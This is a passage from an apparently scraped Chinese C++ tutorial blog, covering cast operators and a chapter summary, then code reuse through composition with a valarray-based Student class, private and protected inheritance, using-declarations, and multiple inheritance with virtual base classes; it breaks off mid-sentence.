dynamic_cast 安全的向下转换（多态类型） 高 是 不能移除 需要虚函数，失败时返回 nullptr 或抛异常 使用原则: 优先使用隐式转换和虚函数。 当需要显式转换时，选择意图最明确、限制最严格的转换运算符。 尽量使用 static_cast 进行“合理”的转换。 只在需要改变 const/volatile 属性时使用 const_cast，并确保不修改原始 const 对象。 避免使用 reinterpret_cast，除非绝对必要且完全理解后果。 在多态类型向下转换时，优先使用 dynamic_cast 以确保安全。 15.6 总结本章探讨了 C++ 中一些高级特性和处理特殊情况的技术，包括友元、嵌套类、异常处理和运行时类型识别（RTTI）以及类型转换运算符。这些工具提供了更精细的控制和更强大的错误处理能力。 主要内容回顾： 友元 (Friends): 允许特定的外部函数（友元函数）、类（友元类）或成员函数（友元成员函数）访问一个类的 private 和 protected 成员。 通过在宿主类中使用 friend 关键字声明。 友元关系不是传递的，也不是对称的。 友元破坏了封装性，应谨慎使用，通常用于重载运算符（如 &lt;&lt;）或实现紧密协作的类。 嵌套类 (Nested Classes): 在一个类（外围类）内部定义的类。 作用域局限于外围类，外部访问需使用作用域解析符 (Enclosing::Nested)。 嵌套类可以访问外围类的所有成员（通过对象、指针或引用）。 外围类访问嵌套类成员受嵌套类自身访问控制限制。 常用于实现与外围类相关的辅助类或隐藏实现细节。 异常处理 (Exceptions): 一种结构化的错误处理机制，用于处理运行时发生的异常情况。 使用 try 块包围可能抛出异常的代码，throw 语句抛出异常，catch 块捕获并处理异常。 相比错误码或 abort()，异常能更好地分离错误检测和处理，自动沿调用栈传播。 推荐使用类对象（最好继承自 std::exception）作为异常类型，可以携带更多信息并利用继承进行分类处理。 栈解退 (Stack Unwinding): 异常发生时，局部对象按构造相反顺序销毁，其析构函数被调用，是 RAII 实现资源安全的关键。 noexcept (C++11): 用于声明函数保证不抛出异常，有助于优化和异常安全保证。析构函数应为 noexcept。 throw; 用于在 catch 块中重新抛出当前异常。 catch(...) 用于捕获任何类型的异常。 异常处理有性能开销，适用于处理异常而非常规流程。 RTTI (运行时类型识别): 允许程序在运行时查询对象的实际类型信息。 主要用于具有虚函数的多态类层次结构。 dynamic_cast&lt;&gt;: 用于安全的向下转换。对指针转换失败返回 nullptr；对引用转换失败抛出 std::bad_cast。 typeid(): 返回对象的类型信息 (std::type_info 对象），可用于比较精确类型。对空指针操作抛出 std::bad_typeid。 std::type_info: 提供 name() 方法获取类型名称（格式依赖实现）和比较运算符。 应优先使用虚函数实现多态，RTTI 作为补充或特定场景下的解决方案。 类型转换运算符: C++ 提供了四个显式类型转换运算符，比 C 风格转换更安全、意图更明确。 static_cast&lt;&gt;: 用于相关的、编译时可检查的转换（数值、向上转换、不安全的向下转换、void*）。 const_cast&lt;&gt;: 唯一能移除或添加 const/volatile 的转换符。修改原始 const 对象是未定义行为。 reinterpret_cast&lt;&gt;: 低级别位模式重新解释，用于不相关指针转换、指针整数互转等。非常危险，不可移植。 dynamic_cast&lt;&gt;: 用于多态类型安全的运行时向下转换。 本章介绍的特性为处理类间关系、错误恢复和类型查询提供了更多工具，但也带来了复杂性。理解它们的原理、适用场景和潜在风险对于编写健壮、高效的 C++ 程序非常重要。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 14 C++中的代码重用","slug":"Cpp_tutorial_Chapter_14","date":"2025-04-30T15:42:24.013Z","updated":"2025-04-30T15:40:20.039Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_14/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_14/","excerpt":"","text":"14.1 包含对象成员的类除了继承 (“is-a” 关系) 之外，C++ 提供了另一种重要的代码重用机制：包含 (Containment) 或 组合 (Composition)**。这种方式模拟的是 **”has-a” （有一个）关系。 当一个类（称为包含类或容器类）将另一个类的对象作为其成员变量时，就使用了包含或组合。例如： 一辆 Car 有一个 Engine。 一个 Person 有一个 Name (可能是 string 对象)。 一个 Order 有一组 OrderItem 对象。 这种方式允许我们通过组合已有的、功能完善的类来构建更复杂的新类。 本节我们将设计一个 Student 类，它将包含一个 std::string 对象（表示学生姓名）和一个 std::valarray&lt;double&gt; 对象（表示学生的考试分数）。 14.1.1 valarray 类简介valarray 是 C++ 标准库中的一个模板类（定义在 &lt;valarray&gt; 头文件中），专门设计用于简化和优化数值数组的操作。它提供了许多方便的功能，例如： 逐元素运算: 可以直接对整个 valarray 对象执行算术运算（如 +, -, *, /），运算会自动应用于每个对应的元素。 数学函数: 可以将许多标准数学函数（如 sqrt(), abs(), sin()）应用于 valarray 的所有元素。 切片和索引: 提供灵活的方式来访问和操作数组的子集。 聚合操作: 内置了计算总和 (sum())、平均值 (sum()/size())、最大值 (max())、最小值 (min()) 等方法。 简单示例: 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;valarray&gt; // 包含 valarray 头文件#include &lt;vector&gt; // 用于初始化示例int main() &#123; std::vector&lt;double&gt; data = &#123;1.1, 2.2, 3.3, 4.4&#125;; std::valarray&lt;double&gt; v1(data.data(), data.size()); // 从 double 数组创建 valarray std::valarray&lt;double&gt; v2 = &#123;10.0, 10.0, 10.0, 10.0&#125;; // 使用初始化列表 (C++11) std::valarray&lt;double&gt; v_sum(4); // 创建一个大小为 4 的 valarray v_sum = v1 + v2; // 逐元素相加: v_sum = &#123;11.1, 12.2, 13.3, 14.4&#125; std::cout &lt;&lt; &quot;Sum of elements in v1: &quot; &lt;&lt; v1.sum() &lt;&lt; std::endl; // 输出 11 std::cout &lt;&lt; &quot;Size of v1: &quot; &lt;&lt; v1.size() &lt;&lt; std::endl; // 输出 4 std::cout &lt;&lt; &quot;Element at index 1 in v_sum: &quot; &lt;&lt; v_sum[1] &lt;&lt; std::endl; // 输出 12.2 v1 *= 2.0; // 所有元素乘以 2: v1 = &#123;2.2, 4.4, 6.6, 8.8&#125; for(double x : v1) &#123; // C++11 范围 for 循环 std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; 我们将使用 valarray&lt;double&gt; 来存储 Student 的多门课成绩。 14.1.2 Student 类的设计我们的 Student 类需要存储姓名和一组分数。 姓名: 使用 std::string 类。 分数: 使用 std::valarray&lt;double&gt; 类。 接口设计: 我们需要提供方法来： 构造 Student 对象（提供姓名和分数）。 获取学生的平均分。 获取学生的姓名。 获取某一门课的分数。 输出学生的信息。 studentc.h (Student 类接口) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#ifndef STUDENTC_H_#define STUDENTC_H_#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;valarray&gt; // 包含 valarrayclass Student &#123;private: // 使用包含（组合）: Student &quot;has-a&quot; string and &quot;has-a&quot; valarray std::string name; // 姓名 std::valarray&lt;double&gt; scores; // 分数 (使用 valarray) // 私有方法，用于输出分数 std::ostream &amp; arr_out(std::ostream &amp; os) const;public: // 构造函数 Student() : name(&quot;Null Student&quot;), scores() &#123;&#125; // 默认构造函数 // 使用 string 和 valarray 初始化 Student(const std::string &amp; s, const std::valarray&lt;double&gt; &amp; a) : name(s), scores(a) &#123;&#125; // 使用 string 和 C 风格数组初始化 Student(const std::string &amp; s, const double * pd, int n) : name(s), scores(pd, n) &#123;&#125; // valarray 构造函数接受 (指针, 数量) // 使用 C 风格字符串和 C 风格数组初始化 Student(const char * str, const double * pd, int n) : name(str), scores(pd, n) &#123;&#125; // string 和 valarray 构造函数处理转换 ~Student() &#123;&#125; // 析构函数 (默认即可，因为 string 和 valarray 会自己管理资源) // 访问器 double Average() const; // 计算平均分 const std::string &amp; Name() const; // 获取姓名 (返回 const 引用避免复制) double operator[](int i) const; // 获取第 i 门课分数 (const 版本) double &amp; operator[](int i); // 获取/设置第 i 门课分数 (非 const 版本) // 友元函数 - 用于输入输出 // input friend std::istream &amp; operator&gt;&gt;(std::istream &amp; is, Student &amp; stu); // 读取姓名 friend std::istream &amp; getline(std::istream &amp; is, Student &amp; stu); // 读取姓名 (整行) // output friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Student &amp; stu);&#125;;#endif // STUDENTC_H_ 关键点: 成员初始化列表: Student 的构造函数使用成员初始化列表来初始化 name 和 scores 成员。 name(s): 调用 std::string 的构造函数（或复制构造函数）来初始化 name。 scores(a) 或 scores(pd, n): 调用 std::valarray&lt;double&gt; 的相应构造函数来初始化 scores。 自动资源管理: 因为 std::string 和 std::valarray 都是设计良好的类，它们会自动管理自己的内存（string 管理字符数据，valarray 管理 double 数据）。因此，Student 类不需要显式地编写析构函数、复制构造函数或赋值运算符来处理 name 和 scores 的内存管理（遵循零法则）。编译器生成的默认版本会正确地调用 string 和 valarray 的相应特殊成员函数。 接口转发: Student 类的一些方法（如 operator[]）将操作转发给其成员对象（scores[i]）。 14.1.3 Student 类示例studentc.cpp (Student 类实现) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &quot;studentc.h&quot;using std::ostream;using std::endl;using std::istream;using std::string;// 公有方法实现double Student::Average() const &#123; if (scores.size() &gt; 0) return scores.sum() / scores.size(); // 使用 valarray 的 sum() 和 size() else return 0;&#125;const string &amp; Student::Name() const &#123; return name;&#125;// 使用 [] 访问分数double Student::operator[](int i) const &#123; return scores[i]; // 调用 valarray 的 operator[]&#125;double &amp; Student::operator[](int i) &#123; return scores[i]; // 调用 valarray 的 operator[]&#125;// 私有方法实现// 输出分数数组ostream &amp; Student::arr_out(ostream &amp; os) const &#123; int i; int lim = scores.size(); if (lim &gt; 0) &#123; for (i = 0; i &lt; lim; i++) &#123; os &lt;&lt; scores[i] &lt;&lt; &quot; &quot;; if (i % 5 == 4) // 每 5 个换行 os &lt;&lt; endl; &#125; if (i % 5 != 0) os &lt;&lt; endl; &#125; else os &lt;&lt; &quot; empty array &quot;; return os;&#125;// 友元函数实现// 使用 &gt;&gt; 读取姓名istream &amp; operator&gt;&gt;(istream &amp; is, Student &amp; stu) &#123; is &gt;&gt; stu.name; // 调用 string 的 operator&gt;&gt; return is;&#125;// 使用 getline 读取姓名 (整行)istream &amp; getline(istream &amp; is, Student &amp; stu) &#123; getline(is, stu.name); // 调用 string 的 getline return is;&#125;// 使用 &lt;&lt; 输出学生信息ostream &amp; operator&lt;&lt;(ostream &amp; os, const Student &amp; stu) &#123; os &lt;&lt; &quot;Scores for &quot; &lt;&lt; stu.name &lt;&lt; &quot;:\\n&quot;; stu.arr_out(os); // 使用私有方法输出分数 return os;&#125; use_stuc.cpp (使用 Student 类) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;iostream&gt;#include &quot;studentc.h&quot; // 包含 Student 类定义using std::cin;using std::cout;using std::endl;void set(Student &amp; sa, int n); // 函数原型const int pupils = 3;const int quizzes = 5;int main() &#123; Student ada[pupils] = &#123; // 创建 Student 对象数组 Student(quizzes), Student(quizzes), Student(quizzes) // 假设有 Student(int n) 构造函数 &#125;; // 假设 studentc.h/cpp 已修改，添加构造函数 Student(int n) // Student::Student(int n) : name(&quot;Nully&quot;), scores(n) &#123;&#125; // 示例构造函数 // 如果没有 Student(int n)，则需要这样创建： // double sample_scores[quizzes] = &#123;0.0&#125;; // 示例分数 // Student ada[pupils] = &#123; // Student(&quot;Default1&quot;, sample_scores, quizzes), // Student(&quot;Default2&quot;, sample_scores, quizzes), // Student(&quot;Default3&quot;, sample_scores, quizzes) // &#125;; // 为了编译通过，我们假设 Student(int n) 存在 int i; for (i = 0; i &lt; pupils; ++i) set(ada[i], quizzes); // 设置学生数据 cout &lt;&lt; &quot;\\nStudent List:\\n&quot;; for (i = 0; i &lt; pupils; ++i) cout &lt;&lt; ada[i].Name() &lt;&lt; endl; // 输出姓名 cout &lt;&lt; &quot;\\nResults:&quot;; for (i = 0; i &lt; pupils; ++i) &#123; cout &lt;&lt; endl &lt;&lt; ada[i]; // 输出完整信息 (调用 operator&lt;&lt;) cout &lt;&lt; &quot;average: &quot; &lt;&lt; ada[i].Average() &lt;&lt; endl; // 输出平均分 &#125; cout &lt;&lt; &quot;Done.\\n&quot;; return 0;&#125;// 函数：设置学生姓名和分数void set(Student &amp; sa, int n) &#123; cout &lt;&lt; &quot;Please enter the student&#x27;s name: &quot;; getline(cin, sa); // 使用友元 getline 读取姓名 cout &lt;&lt; &quot;Please enter &quot; &lt;&lt; n &lt;&lt; &quot; quiz scores:\\n&quot;; for (int i = 0; i &lt; n; i++) cin &gt;&gt; sa[i]; // 使用 operator[] 设置分数 while (cin.get() != &#x27;\\n&#x27;) // 清除输入缓冲区 continue;&#125;// --- 需要修改 studentc.h/cpp 添加 Student(int n) 构造函数 ---/*// studentc.h 添加: explicit Student(int n) : name(&quot;Nully&quot;), scores(n) &#123;&#125; // explicit 防止意外转换// studentc.cpp 不需要额外添加，因为初始化列表已完成工作*/ 编译和运行: 你需要将 studentc.cpp 和 use_stuc.cpp 一起编译链接。 123## 假设 studentc.h/cpp 已添加 Student(int n) 构造函数g++ use_stuc.cpp studentc.cpp -o use_stuc./use_stuc 程序会提示输入每个学生的名字和分数，然后显示学生列表和每个学生的详细信息及平均分。 总结: 包含 (组合) 是通过将一个类的对象作为另一个类的成员来实现的，模拟 “has-a” 关系。 这是代码重用的重要方式，允许利用现有类的功能。 包含类的构造函数通常使用成员初始化列表来调用成员对象的构造函数。 如果成员对象能正确管理自己的资源（如 std::string, std::valarray, 智能指针），包含类通常不需要自定义析构函数、复制/移动操作（零法则）。 包含类可以通过其成员对象的公有接口来使用它们的功能。 14.2 私有继承除了公有继承 (public) 模拟 “is-a” 关系外，C++ 还提供了私有继承 (private)**。私有继承模拟的是 **”has-a” 或更准确地说是 “is-implemented-in-terms-of” （根据…来实现）的关系。 语法: 123class DerivedClassName : private BaseClassName &#123; // ... 派生类成员 ...&#125;; 默认的继承方式（如果省略访问说明符）也是 private (对于 class)。 访问规则: 当一个类私有继承自基类时： 基类的 public 成员在派生类中变为 **private**。 基类的 protected 成员在派生类中变为 **private**。 基类的 private 成员在派生类中仍然是不可直接访问的。 核心思想: 私有继承意味着派生类继承了基类的实现，但不继承其接口。基类的公有方法不会成为派生类对象的公有接口的一部分。外部代码不能通过派生类对象直接调用基类的公有方法。派生类内部的成员函数（以及友元）仍然可以访问基类的 public 和 protected 成员（因为它们在派生类内部是 private 的）。 与公有继承的区别: 关系: 公有继承是 “is-a”，私有继承是 “is-implemented-in-terms-of”。 接口: 公有继承继承接口和实现；私有继承只继承实现。 指针/引用转换: 公有继承下，基类指针/引用可以指向派生类对象；私有继承下，这种隐式转换不允许（除非在派生类内部或其友元中）。 14.2.1 Student 类示例（新版本）让我们重新实现 Student 类，这次使用私有继承而不是包含（组合）。Student 类将私有继承自 std::string（用于姓名）和 std::valarray&lt;double&gt;（用于分数）。 studenti.h (私有继承版本) 12345678910111213141516171819202122232425262728293031323334353637383940414243#ifndef STUDENTI_H_#define STUDENTI_H_#include &lt;iostream&gt;#include &lt;valarray&gt;#include &lt;string&gt;// 使用私有继承的 Student 类class Student : private std::string, private std::valarray&lt;double&gt; &#123;private: // 私有辅助函数，用于输出分数 // 注意：现在可以直接访问 valarray 的方法，但它们是私有的 std::ostream &amp; arr_out(std::ostream &amp; os) const;public: // 构造函数 // 需要显式调用基类的构造函数 Student() : std::string(&quot;Null Student&quot;), std::valarray&lt;double&gt;() &#123;&#125; explicit Student(const std::string &amp; s) : std::string(s), std::valarray&lt;double&gt;() &#123;&#125; explicit Student(int n) : std::string(&quot;Nully&quot;), std::valarray&lt;double&gt;(n) &#123;&#125; Student(const std::string &amp; s, int n) : std::string(s), std::valarray&lt;double&gt;(n) &#123;&#125; Student(const std::string &amp; s, const std::valarray&lt;double&gt; &amp; a) : std::string(s), std::valarray&lt;double&gt;(a) &#123;&#125; Student(const char * str, const double * pd, int n) : std::string(str), std::valarray&lt;double&gt;(pd, n) &#123;&#125; ~Student() &#123;&#125; // 析构函数 (默认即可) // 访问器 - 需要自己提供接口，不能直接用基类的 double Average() const; double &amp; operator[](int i); double operator[](int i) const; const std::string &amp; Name() const; // 提供访问姓名的接口 // 友元函数 - 用于输入输出 friend std::istream &amp; operator&gt;&gt;(std::istream &amp; is, Student &amp; stu); friend std::istream &amp; getline(std::istream &amp; is, Student &amp; stu); friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Student &amp; stu);&#125;;#endif // STUDENTI_H_ studenti.cpp (实现) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &quot;studenti.h&quot;using std::ostream;using std::endl;using std::istream;using std::string;using std::valarray;// 公有方法实现double Student::Average() const &#123; // 可以访问 valarray 的 public 方法 (在 Student 内部是 private) if (valarray&lt;double&gt;::size() &gt; 0) return valarray&lt;double&gt;::sum() / valarray&lt;double&gt;::size(); else return 0;&#125;const string &amp; Student::Name() const &#123; // 可以访问 string 的 public 方法 (在 Student 内部是 private) // 需要强制类型转换回基类类型来调用 return (const string &amp;) *this; // 将 *this 转换为对基类 string 的引用&#125;// 使用 [] 访问分数double &amp; Student::operator[](int i) &#123; // 可以访问 valarray 的 public 方法 (在 Student 内部是 private) // 需要强制类型转换回基类类型来调用 return valarray&lt;double&gt;::operator[](i); // 或者 ((valarray&lt;double&gt; &amp;)*this)[i];&#125;double Student::operator[](int i) const &#123; return valarray&lt;double&gt;::operator[](i); // 或者 ((const valarray&lt;double&gt; &amp;)*this)[i];&#125;// 私有方法实现ostream &amp; Student::arr_out(ostream &amp; os) const &#123; int i; int lim = valarray&lt;double&gt;::size(); if (lim &gt; 0) &#123; for (i = 0; i &lt; lim; i++) &#123; os &lt;&lt; operator[](i) &lt;&lt; &quot; &quot;; // 使用 Student::operator[] if (i % 5 == 4) os &lt;&lt; endl; &#125; if (i % 5 != 0) os &lt;&lt; endl; &#125; else os &lt;&lt; &quot; empty array &quot;; return os;&#125;// 友元函数实现// 友元可以访问派生类的私有成员，包括继承来的私有成员（原基类的公有/保护成员）istream &amp; operator&gt;&gt;(istream &amp; is, Student &amp; stu) &#123; // 直接访问继承来的 string 部分 (现在是 stu 的私有部分) is &gt;&gt; (string &amp;)stu; // 需要类型转换 return is;&#125;istream &amp; getline(istream &amp; is, Student &amp; stu) &#123; getline(is, (string &amp;)stu); // 需要类型转换 return is;&#125;ostream &amp; operator&lt;&lt;(ostream &amp; os, const Student &amp; stu) &#123; os &lt;&lt; &quot;Scores for &quot; &lt;&lt; (const string &amp;) stu &lt;&lt; &quot;:\\n&quot;; // 需要类型转换 stu.arr_out(os); // 调用私有辅助函数 return os;&#125; 使用示例 (use_stui.cpp) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &quot;studenti.h&quot; // 使用私有继承版本#include &lt;iostream&gt;using std::cin;using std::cout;using std::endl;void set(Student &amp; sa, int n); // 函数原型 (同之前)const int pupils = 3;const int quizzes = 5;int main() &#123; Student ada[pupils] = &#123;Student(quizzes), Student(quizzes), Student(quizzes)&#125;; int i; for (i = 0; i &lt; pupils; ++i) set(ada[i], quizzes); cout &lt;&lt; &quot;\\nStudent List:\\n&quot;; for (i = 0; i &lt; pupils; ++i) cout &lt;&lt; ada[i].Name() &lt;&lt; endl; // 调用 Student 提供的 Name() 接口 cout &lt;&lt; &quot;\\nResults:&quot;; for (i = 0; i &lt; pupils; ++i) &#123; cout &lt;&lt; endl &lt;&lt; ada[i]; // 调用 Student 的 operator&lt;&lt; cout &lt;&lt; &quot;average: &quot; &lt;&lt; ada[i].Average() &lt;&lt; endl; // 调用 Student 的 Average() &#125; // 无法直接访问基类方法 // cout &lt;&lt; ada[0].size(); // 错误！valarray::size() 在 Student 中是 private // cout &lt;&lt; ada[0].length(); // 错误！string::length() 在 Student 中是 private // 无法将派生类指针隐式转换为基类指针 // string * pstr = &amp;ada[0]; // 错误！ // valarray&lt;double&gt; * pva = &amp;ada[0]; // 错误！ cout &lt;&lt; &quot;Done.\\n&quot;; return 0;&#125;// set 函数定义 (同之前)void set(Student &amp; sa, int n) &#123; cout &lt;&lt; &quot;Please enter the student&#x27;s name: &quot;; getline(cin, sa); // 使用友元 getline cout &lt;&lt; &quot;Please enter &quot; &lt;&lt; n &lt;&lt; &quot; quiz scores:\\n&quot;; for (int i = 0; i &lt; n; i++) cin &gt;&gt; sa[i]; // 使用 Student::operator[] while (cin.get() != &#x27;\\n&#x27;) continue;&#125; 代码说明: Student 类通过私有继承获得了 string 和 valarray&lt;double&gt; 的所有实现。 构造函数通过初始化列表调用基类的构造函数。 由于基类的公有方法在 Student 中变为私有，Student 类必须提供自己的公有接口（如 Average(), Name(), operator[]）来暴露所需的功能。 在 Student 的成员函数或友元函数内部，需要通过显式类型转换（如 (const string &amp;) *this 或 valarray&lt;double&gt;::sum()）来调用继承来的基类方法（因为它们现在是 Student 的私有成员）。 外部代码不能直接访问继承来的基类方法，也不能将 Student 对象隐式转换为 string 或 valarray&lt;double&gt;。 14.2.2 使用包含还是私有继承对于 “has-a” 或 “is-implemented-in-terms-of” 的关系，我们既可以使用包含 (组合)**，也可以使用私有继承**。那么如何选择呢？ 通常推荐使用包含 (组合): 更清晰: 明确表示 “has-a” 关系，代码更易于理解。Student 类包含一个 name 成员和一个 scores 成员，这很直观。 更简单: 不需要处理继承带来的复杂性（如访问控制变化、构造函数调用链、名称冲突等）。 更灵活: 可以轻松包含多个同类型的成员对象（例如，一个学生可以有家庭住址和学校住址两个 string 成员）。私有继承通常只能继承一个基类一次（虽然多重继承是可能的，但更复杂）。 可以包含指向对象的指针或引用，实现更松散的耦合。 封装性更好: 包含类只能通过成员对象的公有接口与其交互，不会意外地依赖其实现细节（除非成员对象本身封装不佳）。 私有继承的可能优势 (相对少见): 访问 protected 成员: 如果派生类需要访问基类的 protected 成员（数据或函数），私有继承提供了这种能力，而包含则不行（除非通过友元）。 覆盖虚函数: 如果需要覆盖基类的虚函数（即使是私有继承，基类的虚函数在派生类中仍然是虚函数，只是访问权限变为 private），私有继承是必要的。这在使用策略模式或模板方法模式的某些变体时可能有用，但较为高级。 空基类优化 (EBO - Empty Base Optimization): 在某些情况下，如果基类是空的（没有非静态数据成员），编译器可能优化掉基类子对象占用的空间，使得私有继承的对象比包含同样空类成员的对象更小。但这通常是微优化，不应作为主要选择依据。 结论: 对于大多数 “has-a” 关系，**优先选择包含 (组合)**。只有在需要访问基类的 protected 成员或覆盖其虚函数等特殊情况下，才考虑使用私有继承。 14.2.3 保护继承除了 public 和 private 继承，还有**保护继承 (protected)**。 语法: 123class DerivedClassName : protected BaseClassName &#123; // ...&#125;; 访问规则: 当一个类保护继承自基类时： 基类的 public 成员在派生类中变为 **protected**。 基类的 protected 成员在派生类中变为 **protected**。 基类的 private 成员在派生类中仍然是不可直接访问的。 特点: 与私有继承类似，它也是一种实现继承，不继承接口。外部代码不能访问继承来的成员。 与私有继承不同的是，基类的公有和保护成员在派生类中是 protected 的，这意味着后续从该派生类继承的类仍然可以访问这些成员。而在私有继承下，这些成员在派生类中变为 private，后续的派生类就无法访问了。 用途: 保护继承非常少见。它主要用于一种特殊情况：你想让基类的实现对外部隐藏，但又希望后续的派生类能够访问这些实现。 14.2.4 使用 using 重新定义访问权限有时，在使用私有或保护继承时，我们可能希望将基类的某个特定成员恢复其原始的访问权限（或使其变为 public），而不是让它在派生类中保持 private 或 protected。可以使用 using 声明来实现这一点。 语法: 在派生类的定义中（通常放在 public 或 protected 部分），使用： 1using BaseClassName::MemberName; 这会将 BaseClassName 中的 MemberName（可以是数据成员、成员函数、甚至重载的一组函数）引入到派生类的作用域，并使其具有 using 声明所在区域的访问权限（如果在 public 下，就变为 public；如果在 protected 下，就变为 protected）。 示例 (修改 Student 类): 假设我们希望 Student 类（私有继承版本）能够直接使用 valarray 的 size() 和 sum() 方法，就像它们是 Student 的公有方法一样。 1234567891011121314151617181920212223242526272829303132// studenti.h (修改后)class Student : private std::string, private std::valarray&lt;double&gt; &#123;private: std::ostream &amp; arr_out(std::ostream &amp; os) const;public: // ... 构造函数 ... ~Student() &#123;&#125; // 使用 using 声明将基类的部分成员暴露为 public using std::valarray&lt;double&gt;::size; // 使 valarray::size() 成为 Student 的 public 成员 using std::valarray&lt;double&gt;::operator[]; // 使 valarray::operator[] 成为 Student 的 public 成员 // 仍然需要提供自己的接口，或者暴露更多基类成员 double Average() const; const std::string &amp; Name() const; // operator[] 现在通过 using 声明暴露了，可以移除 Student 自己的版本 (如果签名匹配) // ... 友元 ...&#125;;// studenti.cpp (修改后)double Student::Average() const &#123; // 现在可以直接调用 size() 和 sum() (如果 sum 也 using 了) if (size() &gt; 0) // 直接调用继承来的 size() // return sum() / size(); // 假设 sum() 也 using 了 return std::valarray&lt;double&gt;::sum() / size(); // 或者仍然显式调用 else return 0;&#125;// operator[] 的实现可以移除了，因为 using 声明提供了它// ... 其他实现可能也需要调整 ... 注意: using 声明只改变成员的可访问性，不改变其继承属性（例如，虚函数仍然是虚函数）。它不能用来降低访问权限（例如，不能在 private 部分 using 一个基类的 public 成员来使其变为 private）。 using 声明提供了一种在私有/保护继承下选择性地暴露基类接口的方法，但过度使用可能会破坏原本隐藏实现的意图。 14.3 多重继承多重继承 (Multiple Inheritance, MI) 允许一个派生类从多个基类继承。这意味着派生类可以同时拥有多个基类的特性和接口。 语法: 123class DerivedClassName : accessSpecifier1 BaseClass1, accessSpecifier2 BaseClass2, ... &#123; // ... 派生类成员 ...&#125;; 在类头中列出所有要继承的基类，用逗号分隔。 可以为每个基类指定不同的访问说明符（public, protected, private）。 示例场景: 假设我们有一个通用的 Worker 类，表示工作人员的基本信息。我们还有 Singer 类表示歌手，Waiter 类表示服务员。现在我们想创建一个 SingingWaiter 类，表示一个既会唱歌又能提供服务的服务员。SingingWaiter 可以同时继承 Singer 和 Waiter。 12345678class Worker &#123; /* ... id, name ... */ &#125;;class Singer &#123; /* ... voice range, sing() ... */ &#125;;class Waiter &#123; /* ... panache, serve() ... */ &#125;;// SingingWaiter 继承自 Singer 和 Waiterclass SingingWaiter : public Singer, public Waiter &#123; // ... SingingWaiter 特有的成员 ...&#125;; 潜在问题: 多重继承虽然强大，但也引入了一些复杂性和潜在的问题： 14.3.1 有多少 Worker (钻石问题 - Diamond Problem)如果多个基类是从同一个更远的基类派生而来的，那么派生类将包含该共同基类的多个副本（每个继承路径一个）。这被称为钻石问题或菱形继承。 示例: 假设 Singer 和 Waiter 都继承自 Worker。 12345678910111213141516171819202122232425262728293031class Worker &#123;public: long id; std::string fullname; virtual ~Worker() &#123;&#125; virtual void Show() const &#123; /* ... show id, name ... */ &#125; // ... other methods ...&#125;;class Waiter : public Worker &#123;public: int panache; virtual void Show() const override &#123; /* ... show worker info + panache ... */ &#125; // ... other methods ...&#125;;class Singer : public Worker &#123;public: enum &#123;other, alto, contralto, soprano, bass, baritone, tenor&#125;; static const int Vtypes = 7; int voice; virtual void Show() const override &#123; /* ... show worker info + voice ... */ &#125; // ... other methods ...&#125;;// SingingWaiter 继承自 Waiter 和 Singer，两者都继承自 Workerclass SingingWaiter : public Waiter, public Singer &#123;public: virtual void Show() const override &#123; /* ... show all info ... */ &#125; // ... other methods ...&#125;; 在这种情况下，一个 SingingWaiter 对象内部会包含两个 Worker 子对象：一个来自 Waiter 的继承路径，另一个来自 Singer 的继承路径。 这会导致几个问题： 成员访问歧义: 如果你想访问 SingingWaiter 对象的 id 或 fullname（来自 Worker），编译器不知道你指的是哪个 Worker 子对象的成员。 12SingingWaiter sw;// sw.id = 123; // 错误！歧义：Waiter::Worker::id 还是 Singer::Worker::id？ 资源冗余: Worker 的数据成员被存储了两次，造成浪费。 解决方案：虚基类 (Virtual Base Classes) 为了解决钻石问题，C++ 引入了虚基类的概念。当一个类被声明为虚基类时，派生类在通过多条路径继承该基类时，只会包含该虚基类的一个共享子对象副本。 语法: 在派生类继承虚基类时，使用 virtual 关键字。 123456// Waiter 和 Singer 将 Worker 作为虚基类继承class Waiter : virtual public Worker &#123; /* ... */ &#125;;class Singer : virtual public Worker &#123; /* ... */ &#125;;// SingingWaiter 正常继承 Waiter 和 Singerclass SingingWaiter : public Waiter, public Singer &#123; /* ... */ &#125;; 效果: 现在，SingingWaiter 对象只包含一个共享的 Worker 子对象。访问 id 或 fullname 不再有歧义。 12SingingWaiter sw;sw.id = 123; // OK！只有一个 Worker 子对象，没有歧义。 构造函数责任: 当使用虚基类时，最底层的派生类（在这个例子中是 SingingWaiter）的构造函数负责调用虚基类（Worker）的构造函数。中间的基类（Waiter, Singer）在其初始化列表中对虚基类的构造函数调用会被忽略（除非该中间类是直接创建对象）。 1234567// SingingWaiter 构造函数需要初始化 WorkerSingingWaiter::SingingWaiter(const Worker &amp; wk, int p, int v) : Worker(wk), // 显式调用虚基类构造函数 Waiter(wk, p), Singer(wk, v) &#123; // Waiter(wk, p) 和 Singer(wk, v) 内部对 Worker 的构造调用会被忽略&#125; 14.3.2 哪个方法 (成员名冲突)即使没有钻石问题，如果不同的基类提供了同名的方法或数据成员，派生类在调用该成员时也会产生歧义。 示例: 假设 Waiter 和 Singer 都有一个名为 Talent() 的方法。 12345678910111213141516class Waiter &#123;public: void Talent() const &#123; std::cout &lt;&lt; &quot;Serves with style.\\n&quot;; &#125; // ...&#125;;class Singer &#123;public: void Talent() const &#123; std::cout &lt;&lt; &quot;Sings beautifully.\\n&quot;; &#125; // ...&#125;;class SingingWaiter : public Waiter, public Singer &#123; // ...&#125;;SingingWaiter sw;// sw.Talent(); // 错误！歧义：Waiter::Talent() 还是 Singer::Talent()？ 解决方案：使用作用域解析运算符 (::) 为了解决这种歧义，需要使用作用域解析运算符明确指定要调用哪个基类的版本： 12sw.Waiter::Talent(); // 调用 Waiter 版本的 Talent()sw.Singer::Talent(); // 调用 Singer 